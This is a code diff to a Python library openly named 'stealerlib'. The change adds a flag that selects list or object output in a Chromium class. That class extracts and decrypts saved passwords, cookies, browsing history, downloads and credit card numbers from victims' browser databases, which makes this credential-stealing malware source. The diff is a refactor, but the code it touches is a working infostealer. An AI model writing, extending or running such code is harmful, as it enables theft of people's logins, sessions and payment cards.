@@ -6,6 +6,7 @@
 """
 
 from stealerlib.browser import *
+from stealerlib.browser.types import BrowserTypes
 
 
 class Chromium:
@@ -58,7 +59,7 @@ class Chromium:
         self.chromium_history = []
         self.chromium_banking = []
 
-    def cget(self, func: callable) -> list:
+    def cget(self, func: callable, conv: bool=True) -> list:
         temp_data = []
 
         for _, path in self.browsers.items():
@@ -73,7 +74,7 @@ class Chromium:
                 if not os.path.exists(path + '\\' + profile):
                     continue
 
-                data = func(path, profile)
+                data = func(path, profile, conv)
                 temp_data.append(data)
 
         return temp_data
@@ -125,7 +126,7 @@ class Chromium:
 
         return decrypted_pass
 
-    def _chromium_passwords(self, path: str, profile: str) -> list:
+    def _chromium_passwords(self, path: str, profile: str, conv: bool=True) -> list:
         """Retrieves the site url, username and password from the passed Chromium browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
@@ -133,9 +134,10 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the passwords from
             profile (str): Chrome profile to use (if available)
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -156,15 +158,18 @@ class Chromium:
                 continue
 
             password = self.decrypt_password(row[2], self.master_key)
-            login = BrowserTypes.Login(row[0], row[1], password)
-            self.chromium_passwords.append(login.conv())
+            obj_login = BrowserTypes.Login(row[0], row[1], password)
+
+            self.chromium_passwords.append(
+                obj_login.conv() if conv else obj_login
+            )
 
         conn.close()
         os.remove('login_db')
 
         return self.chromium_passwords
 
-    def _chromium_cookies(self, path: str, profile: str):
+    def _chromium_cookies(self, path: str, profile: str, conv: bool=True):
         """Retrieves the site host, cookie name, value and various other information from the passed Chromium browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
@@ -172,9 +177,10 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the cookie information from
             profile (str): Chrome profile to use (if available)
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -195,15 +201,18 @@ class Chromium:
                 continue
 
             value = self.decrypt_password(row[3], self.master_key)
-            cookie = BrowserTypes.Cookie(row[0], row[1], row[2], value, bool(row[4]), row[4])
-            self.chromium_cookies.append(cookie.conv())
+            obj_cookie = BrowserTypes.Cookie(row[0], row[1], row[2], value, bool(row[4]), row[4])
+
+            self.chromium_cookies.append(
+                obj_cookie.conv() if conv else obj_cookie
+            )
 
         conn.close()
         os.remove('cookie_db')
 
         return self.chromium_cookies
 
-    def _chromium_history(self, path: str, profile: str) -> list:
+    def _chromium_history(self, path: str, profile: str, conv: bool=True) -> list:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -211,9 +220,10 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the web history from
             profile (str): Chrome profile to use (if available)
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -233,15 +243,17 @@ class Chromium:
             if not row[0] or not row[1] or not row[2]:
                 continue
 
-            site = BrowserTypes.Site(row[0], row[1], row[2])
-            self.chromium_history.append(site.conv())
+            obj_site = BrowserTypes.Site(row[0], row[1], row[2])
+            self.chromium_history.append(
+                obj_site.conv() if conv else obj_site
+            )
 
         conn.close()
         os.remove('web_history_db')
 
         return self.chromium_history
 
-    def _chromium_downloads(self, path: str, profile: str) -> list:
+    def _chromium_downloads(self, path: str, profile: str, conv: bool=True) -> list:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -249,9 +261,10 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the download history from
             profile (str): Chrome profile to use (if available)
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -271,15 +284,17 @@ class Chromium:
             if not row[0] or not row[1]:
                 continue
 
-            download = BrowserTypes.Download(row[0], row[1])
-            self.chromium_downloads.append(download.conv())
+            obj_download = BrowserTypes.Download(row[0], row[1])
+            self.chromium_downloads.append(
+                obj_download.conv() if conv else obj_download
+            )
 
         conn.close()
         os.remove('downloads_db')
 
         return self.chromium_downloads
 
-    def _chromium_credit_cards(self, path: str, profile: str) -> list:
+    def _chromium_credit_cards(self, path: str, profile: str, conv: bool=True) -> list:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -287,9 +302,10 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the bank cards from from
             profile (str): Chrome profile to use (if available)
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -310,8 +326,10 @@ class Chromium:
                 continue
 
             card_number = self.decrypt_password(row[3], self.master_key)
-            card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])
-            self.chromium_banking.append(card.conv())
+            obj_card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])
+            self.chromium_banking.append(
+                obj_card.conv() if conv else obj_card
+            )
 
         conn.close()
         os.remove('cards_db')
